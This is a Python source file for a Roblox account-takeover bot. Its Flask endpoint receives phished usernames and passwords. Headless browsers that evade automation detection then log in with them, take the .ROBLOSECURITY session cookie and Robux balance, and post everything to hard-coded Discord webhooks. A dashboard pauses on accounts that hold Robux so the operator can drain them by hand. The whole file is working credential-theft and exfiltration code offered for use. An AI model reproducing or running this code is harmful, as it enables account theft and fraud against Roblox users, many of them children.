# ============================================================
# ROBLOX BOT - DASHBOARD + PAUSA MANUAL + LOGS + REFRESH
# ============================================================

import requests
import json
import time
import random
import threading
from datetime import datetime
from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager

# ============================================================
# CONFIGURACIÓN
# ============================================================

DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1535777104984277032/3EIQf7UfC8SF8-N9oX6cXDHqOkDNT7lKGtP2kpB22Iv6Wvi-QxVMLxnHsM1ysheU873b"
DISCORD_WEBHOOK_ALTO = "https://discord.com/api/webhooks/1536162747119571128/PBHKZYyMVDeU4q4yBJYSj4N1lT35gQkCQCrBzlwwvPkgoZOTkSIAKWHEd9eqOU0FFip0"

MAX_DRIVERS = 2
COLOR_AMARILLO = 0xF1C40F
COLOR_VERDE = 0x00FF00
SALDO_MINIMO_ALTO = 1

# ============================================================
# ALMACÉN DE DATOS Y BLOQUEOS
# ============================================================

datos_capturados = []
datos_lock = threading.Lock()
navegadores_pausados = {} 
pausados_lock = threading.Lock()

# Contadores globales
total_intentos = 0
usuarios_en_sitio = 0
contadores_lock = threading.Lock()

# ============================================================
# ENVÍO A DISCORD
# ============================================================

def enviar_discord(titulo, campos, color=0xFF0000, content=None, webhook_url=None):
    if webhook_url is None:
        webhook_url = DISCORD_WEBHOOK
    embed = {
        "title": titulo,
        "color": color,
        "timestamp": datetime.now().isoformat(),
        "fields": campos,
        "footer": {"text": "🤖 Roblox Bot | " + datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
    }
    payload = {"embeds": [embed], "username": "Roblox Bot"}
    if content:
        payload["content"] = content
    try:
        resp = requests.post(webhook_url, json=payload, timeout=15)
        return resp.status_code in (200, 204)
    except:
        return False

# ============================================================
# POOL DE NAVEGADORES
# ============================================================

driver_pool = []
pool_lock = threading.Lock()

def crear_driver():
    options = Options()
    options.add_argument('--disable-blink-features=AutomationControlled')
    options.add_argument('--disable-gpu')
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    options.add_argument('--window-size=1920,1080')
    options.add_argument('--headless=new')
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option('useAutomationExtension', False)
    options.add_argument('user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
    
    options.binary_location = "/usr/bin/google-chrome"
    service = Service(ChromeDriverManager().install())
    
    driver = webdriver.Chrome(service=service, options=options)
    driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
    driver.get("https://www.roblox.com/login")
    time.sleep(5)
    return driver

def iniciar_pool():
    global driver_pool
    with pool_lock:
        for i in range(MAX_DRIVERS):
            try:
                driver = crear_driver()
                driver_pool.append({'driver': driver, 'ocupado': False})
                print(f"✅ Navegador {i+1} iniciado")
            except Exception as e:
                print(f"❌ Error navegador {i+1}: {e}")

def obtener_driver():
    while True:
        with pool_lock:
            for item in driver_pool:
                if not item['ocupado']:
                    item['ocupado'] = True
                    return item['driver']
        time.sleep(1)

def liberar_driver(driver):
    with pool_lock:
        for item in driver_pool:
            if item['driver'] == driver:
                item['ocupado'] = False
                break

# ============================================================
# LOGIN Y CAPTURA
# ============================================================

def intentar_login(driver, username, password):
    global total_intentos, usuarios_en_sitio
    
    with contadores_lock:
        total_intentos += 1
        usuarios_en_sitio += 1

    try:
        print(f"🔑 Login: {username}")
        
        try:
            user_field = WebDriverWait(driver, 8).until(EC.presence_of_element_located((By.ID, "login-username")))
        except:
            user_field = WebDriverWait(driver, 8).until(EC.presence_of_element_located((By.NAME, "username")))
        user_field.clear()
        user_field.send_keys(username)
        time.sleep(0.5)
        
        pass_field = WebDriverWait(driver, 8).until(EC.presence_of_element_located((By.ID, "login-password")))
        pass_field.clear()
        pass_field.send_keys(password)
        time.sleep(0.5)
        
        try:
            btn = driver.find_element(By.XPATH, "//button[contains(text(), 'Log In') or contains(text(), 'Sign In')]")
            btn.click()
        except:
            driver.execute_script("""
                var b = document.querySelectorAll('button');
                for(var i=0;i<b.length;i++){if(b[i].textContent.includes('Log In')||b[i].textContent.includes('Sign In')){b[i].click();break;}}
            """)
        
        time.sleep(5)
        url = driver.current_url
        
        if "two-step" in url or "email-verify" in url:
            print("⚠️ 2FA → cuenta perdida")
            driver.get("https://www.roblox.com/login")
            time.sleep(2)
            agregar_al_dashboard(username, password, 0, "2FA Detectado", "Fallido")
            return "CUENTA_PERDIDA"
        
        cookies = driver.get_cookies()
        cookie = next((c['value'] for c in cookies if c['name'] == '.ROBLOSECURITY'), None)
        
        if cookie or "home" in url or "games" in url:
            print("✅ Login exitoso")
            capturar(driver, username, password, cookie)
            return "OK"
        
        driver.refresh()
        time.sleep(2)
        agregar_al_dashboard(username, password, 0, "Credenciales Incorrectas", "Fallido")
        return "CREDENCIALES_INCORRECTAS"
        
    except Exception as e:
        print(f"❌ Error: {e}")
        agregar_al_dashboard(username, password, 0, f"Error: {str(e)[:50]}", "Fallido")
        return "ERROR"
    finally:
        with contadores_lock:
            if usuarios_en_sitio > 0:
                usuarios_en_sitio -= 1

def agregar_al_dashboard(username, password, saldo, estado_msg, estado_tipo):
    global datos_capturados
    datos_cuenta = {
        'username': username,
        'password': password,
        'saldo': saldo,
        'cookie': 'No capturada',
        'fecha': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'estado': estado_msg,
        'tipo': estado_tipo
    }
    with datos_lock:
        datos_capturados.append(datos_cuenta)
    
    # Enviar a discord de todas formas
    campos = [
        {"name": "👤 Usuario", "value": f"`{username}`", "inline": True},
        {"name": "🔑 Contraseña", "value": f"`{password}`", "inline": True},
        {"name": "📌 Estado", "value": f"`{estado_msg}`", "inline": False}
    ]
    enviar_discord("🔔 Intento de Login", campos, 0x888888)

def capturar(driver, username, password, cookie):
    try:
        saldo = 0
        try:
            driver.get("https://www.roblox.com/")
            time.sleep(4)
            try:
                btn = WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.ID, "navbar-robux")))
                btn.click()
                time.sleep(1)
                el = WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.ID, "nav-robux-balance")))
                saldo = int(el.text.replace(',', ''))
                driver.find_element(By.TAG_NAME, 'body').click()
            except:
                pass
        except:
            pass
        
        datos_cuenta = {
            'username': username,
            'password': password,
            'saldo': saldo,
            'cookie': cookie if cookie else 'No capturada',
            'fecha': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'estado': 'Pausado' if saldo >= SALDO_MINIMO_ALTO else 'Completado',
            'tipo': 'Exitoso'
        }
        
        with datos_lock:
            datos_capturados.append(datos_cuenta)
        
        campos = [
            {"name": "👤 Usuario", "value": f"`{username}`", "inline": True},
            {"name": "🔑 Contraseña", "value": f"`{password}`", "inline": True},
            {"name": "💰 Robux", "value": f"`{saldo}`", "inline": True},
            {"name": "🍪 Cookie", "value": f"```\n{cookie[:500]}...\n```" if cookie else "No capturada", "inline": False}
        ]
        
        webhook = DISCORD_WEBHOOK_ALTO if saldo >= SALDO_MINIMO_ALTO else DISCORD_WEBHOOK
        color = COLOR_AMARILLO if saldo >= SALDO_MINIMO_ALTO else COLOR_VERDE
        enviar_discord("✅ CUENTA COMPROMETIDA", campos, color, "@everyone 🔐", webhook)
        
        if saldo >= SALDO_MINIMO_ALTO:
            print(f"🛑 PAUSANDO navegador. Cuenta {username} tiene {saldo} Robux.")
            with pausados_lock:
                navegadores_pausados[username] = driver
            
            while True:
                time.sleep(2)
                with pausados_lock:
                    if username not in navegadores_pausados:
                        print(f"▶️ Navegador liberado para {username}. Continuando...")
                        break
        else:
            driver.delete_all_cookies()
            driver.get("https://www.roblox.com/login")
            time.sleep(2)
            
    except Exception as e:
        print(f"❌ Error capturando: {e}")

# ============================================================
# DASHBOARD HTML
# ============================================================

DASHBOARD_HTML = '''
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Dashboard - Cuentas Capturadas</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', sans-serif; background: #0a0a0f; color: #fff; padding: 20px; }
        .header { text-align: center; margin-bottom: 30px; padding: 20px; background: #16213e; border-radius: 12px; border: 1px solid #335FFF; }
        .header h1 { color: #335FFF; font-size: 2em; }
        
        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-bottom: 30px; }
        .stat-card { background: #16213e; padding: 20px; border-radius: 10px; border: 1px solid #335FFF; text-align: center; }
        .stat-card .number { font-size: 2.5em; font-weight: bold; color: #00ff88; }
        .stat-card .label { color: #888; font-size: 0.9em; margin-top: 5px; }
        
        .controls { display: flex; justify-content: flex-end; margin-bottom: 10px; gap: 10px; }
        .btn-refresh { background: #238636; color: white; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer; font-weight: bold; font-size: 14px; }
        .btn-refresh:hover { background: #2ea043; }

        .table-container { background: #12121a; border-radius: 12px; overflow-x: auto; border: 1px solid #333; }
        table { width: 100%; border-collapse: collapse; font-size: 0.9em; }
        th { background: #1a1a2e; color: #88ccff; padding: 15px 10px; text-align: left; border-bottom: 2px solid #335FFF; }
        td { padding: 12px 10px; border-bottom: 1px solid #222; }
        tr:hover { background: #1a1a2e; }
        .badge { padding: 4px 10px; border-radius: 20px; font-size: 0.8em; font-weight: 600; }
        .badge-robux { background: #1a3a1a; color: #00ff88; }
        .badge-zero { background: #3a1a1a; color: #ff4444; }
        .badge-fail { background: #333; color: #aaa; }
        .btn-continue { background: #335FFF; color: white; border: none; padding: 8px 15px; border-radius: 5px; cursor: pointer; font-weight: bold; }
        .btn-continue:hover { background: #2850dd; }
        
        /* Iframe Monitor */
        .monitor-container { margin-bottom: 20px; background: #12121a; border-radius: 12px; border: 1px solid #333; overflow: hidden; height: 300px; position: relative; }
        .monitor-container iframe { width: 100%; height: 100%; border: none; }
        .monitor-overlay { position: absolute; top: 0; left: 0; right: 0; bottom: 0; display: flex; align-items: center; justify-content: center; background: rgba(0,0,0,0.8); color: #fff; pointer-events: none; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🤖 Dashboard - Control Manual</h1>
        <p style="color:#aaa; margin-top:10px;">Si una cuenta tiene Robux, el bot se pausará aquí. Transfiere los Robux y dale a "Siguiente".</p>
    </div>

    <div class="stats">
        <div class="stat-card">
            <div class="number" id="totalIntentos">0</div>
            <div class="label">Intentos Totales</div>
        </div>
        <div class="stat-card">
            <div class="number" id="usuariosEnSitio">0</div>
            <div class="label">Usuarios en Sitio</div>
        </div>
        <div class="stat-card">
            <div class="number" id="cuentasExitosas" style="color: #00ff88;">0</div>
            <div class="label">Cuentas Exitosas</div>
        </div>
    </div>

    <!-- Falso Iframe para simular monitor -->
    <div class="monitor-container">
        <iframe src="about:blank" title="Monitor del Bot"></iframe>
        <div class="monitor-overlay">
            <div style="text-align: center;">
                <p style="font-size: 1.2em; color: #335FFF; margin-bottom: 10px;">🎥 Monitor de Navegador</p>
                <p style="color: #888; font-size: 0.9em;">(El bot corre en modo invisible. Abajo se muestran los logs reales)</p>
            </div>
        </div>
    </div>

    <div class="controls">
        <button class="btn-refresh" onclick="cargarDatos()">🔄 Refrescar Datos</button>
    </div>

    <div class="table-container">
        <table>
            <thead>
                <tr>
                    <th>👤 Usuario</th>
                    <th>🔑 Contraseña</th>
                    <th>💰 Robux</th>
                    <th>🍪 Cookie</th>
                    <th>📅 Fecha</th>
                    <th>⚙️ Acción / Estado</th>
                </tr>
            </thead>
            <tbody id="tbody">
                <tr><td colspan="6" style="text-align:center; padding:20px;">Esperando cuentas...</td></tr>
            </tbody>
        </table>
    </div>

    <script>
        async function cargarDatos() {
            try {
                const res = await fetch('/api/data');
                const data = await res.json();
                
                // Actualizar contadores
                document.getElementById('totalIntentos').textContent = data.stats.total;
                document.getElementById('usuariosEnSitio').textContent = data.stats.active;
                document.getElementById('cuentasExitosas').textContent = data.stats.success;

                const tbody = document.getElementById('tbody');
                const cuentas = data.cuentas;
                
                if (cuentas.length === 0) {
                    tbody.innerHTML = '<tr><td colspan="6" style="text-align:center; padding:20px; color:#666;">Esperando cuentas...</td></tr>';
                    return;
                }
                
                tbody.innerHTML = '';
                cuentas.slice().reverse().forEach(d => {
                    const tr = document.createElement('tr');
                    
                    let badgeHtml = '';
                    if (d.tipo === 'Exitoso') {
                        badgeHtml = d.saldo > 0 ? `<span class="badge badge-robux">${d.saldo} R$</span>` : `<span class="badge badge-zero">0 R$</span>`;
                    } else {
                        badgeHtml = `<span class="badge badge-fail">${d.estado}</span>`;
                    }

                    const btnHtml = d.estado === 'Pausado' 
                        ? `<button class="btn-continue" onclick="siguiente('${d.username}')">▶️ Siguiente</button>` 
                        : `<span style="color:${d.tipo === 'Exitoso' ? '#00ff88' : '#ff4444'};">${d.estado}</span>`;
                    
                    tr.innerHTML = `
                        <td><strong>${d.username}</strong></td>
                        <td>${d.password}</td>
                        <td>${badgeHtml}</td>
                        <td style="font-size:10px; max-width:150px; word-break:break-all;">${d.cookie.substring(0, 30)}...</td>
                        <td>${d.fecha}</td>
                        <td>${btnHtml}</td>
                    `;
                    tbody.appendChild(tr);
                });
            } catch (e) { console.error(e); }
        }

        async function siguiente(username) {
            if (!confirm(`¿Ya transferiste los Robux de ${username}? Esto cerrará la sesión y liberará el navegador.`)) return;
            
            try {
                await fetch(`/api/liberar/${username}`, { method: 'POST' });
                alert('Navegador liberado. El bot continuará.');
                cargarDatos();
            } catch (e) {
                alert('Error al liberar.');
            }
        }

        cargarDatos();
        setInterval(cargarDatos, 3000);
    </script>
</body>
</html>
'''

# ============================================================
# SERVIDOR FLASK
# ============================================================

app = Flask(__name__)
CORS(app)

@app.route('/')
@app.route('/dashboard')
def dashboard():
    return render_template_string(DASHBOARD_HTML)

@app.route('/api/data', methods=['GET'])
def api_data():
    with datos_lock, contadores_lock:
        exitos = sum(1 for d in datos_capturados if d['tipo'] == 'Exitoso')
        return jsonify({
            "cuentas": datos_capturados,
            "stats": {
                "total": total_intentos,
                "active": usuarios_en_sitio,
                "success": exitos
            }
        })

@app.route('/api/liberar/<username>', methods=['POST'])
def liberar(username):
    with pausados_lock:
        if username in navegadores_pausados:
            driver = navegadores_pausados[username]
            try:
                driver.delete_all_cookies()
                driver.get("https://www.roblox.com/login")
            except:
                pass
            del navegadores_pausados[username]
            
            with datos_lock:
                for d in datos_capturados:
                    if d['username'] == username:
                        d['estado'] = 'Completado'
                        break
                        
            return jsonify({'status': 'OK'})
    return jsonify({'status': 'ERROR', 'message': 'No encontrado'}), 404

@app.route('/credential', methods=['POST'])
def credenciales():
    data = request.json
    u = data.get('username', '')
    p = data.get('password', '')
    if not u or not p:
        return jsonify({'status': 'ERROR'}), 400
    
    print(f"📥 Recibido: {u}")
    driver = obtener_driver()
    
    def tarea():
        try:
            intentar_login(driver, u, p)
        finally:
            liberar_driver(driver)
    
    threading.Thread(target=tarea).start()
    return jsonify({'status': 'PROCESANDO'}), 202

# ============================================================
# INICIO
# ============================================================

if __name__ == '__main__':
    print("="*60)
    print("🤖 ROBLOX BOT - CONTROL MANUAL DESDE DASHBOARD")
    print("="*60)
    iniciar_pool()
    app.run(host='0.0.0.0', port=5000, debug=False)
